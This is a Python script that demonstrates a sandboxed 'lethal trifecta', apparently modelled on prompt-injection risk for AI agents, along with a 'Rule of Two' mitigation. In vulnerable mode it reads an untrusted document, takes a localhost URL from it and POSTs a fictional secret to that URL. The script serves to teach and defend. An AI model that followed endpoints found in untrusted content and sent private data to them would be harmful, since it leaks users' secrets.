#!/usr/bin/env python3
"""Sandboxed lethal-trifecta demonstration.

Vulnerable mode combines:
1. untrusted local content,
2. access to fictional private data,
3. a localhost-only outbound capability.

Rule-of-Two mode removes the outbound capability.
"""

from __future__ import annotations

import argparse
import re
import urllib.error
import urllib.request

from pathlib import Path


URL_PATTERN = re.compile(
    r"https?://localhost:\d+/",
    re.IGNORECASE,
)


def run_vulnerable(
    secret_path: Path,
    doc_path: Path,
) -> int:

    untrusted_text = (
        doc_path.read_text(
            encoding="utf-8"
        )
    )

    match = URL_PATTERN.search(
        untrusted_text
    )

    if not match:

        print(
            "No outbound instruction found"
        )

        return 1

    fake_secret = (
        secret_path
        .read_text(
            encoding="utf-8"
        )
        .strip()
    )

    endpoint = match.group(
        0
    )

    print(
        "UNTRUSTED CONTENT READ"
    )

    print(
        "PRIVATE DATA READ: "
        "fictional lab value"
    )

    print(
        "OUTBOUND TOOL USED: "
        f"{endpoint}"
    )

    request = urllib.request.Request(
        endpoint,
        data=fake_secret.encode(
            "utf-8"
        ),
        method="POST",
        headers={
            "Content-Type":
            "text/plain",
        },
    )

    try:

        with urllib.request.urlopen(
            request,
            timeout=2,
        ) as response:

            print(
                "LOCAL POST STATUS: "
                f"{response.status}"
            )

    except (
        urllib.error.URLError,
        TimeoutError,
    ) as exc:

        print(
            "LOCAL LISTENER DID NOT "
            "RETURN HTTP RESPONSE: "
            f"{type(exc).__name__}"
        )

    print(
        "VULNERABLE DEMO COMPLETE"
    )

    return 0


def run_rule_of_two(
    doc_path: Path,
) -> int:

    _ = doc_path.read_text(
        encoding="utf-8"
    )

    print(
        "UNTRUSTED CONTENT READ"
    )

    print(
        "OUTBOUND CAPABILITY: REMOVED"
    )

    print(
        "RULE OF TWO BLOCK: "
        "secret was not read "
        "or transmitted"
    )

    return 0


def parse_args() -> argparse.Namespace:

    parser = argparse.ArgumentParser()

    parser.add_argument(
        "--mode",
        choices=[
            "vulnerable",
            "rule-of-two",
        ],
        required=True,
    )

    parser.add_argument(
        "--secret",
        default=(
            "sandbox/"
            "fake_secret.txt"
        ),
    )

    parser.add_argument(
        "--document",
        default=(
            "sandbox/"
            "untrusted_doc.txt"
        ),
    )

    return parser.parse_args()


def main() -> int:

    args = parse_args()

    secret_path = Path(
        args.secret
    )

    doc_path = Path(
        args.document
    )

    if args.mode == "vulnerable":

        return run_vulnerable(
            secret_path,
            doc_path,
        )

    return run_rule_of_two(
        doc_path
    )


if __name__ == "__main__":
    raise SystemExit(
        main()
    )
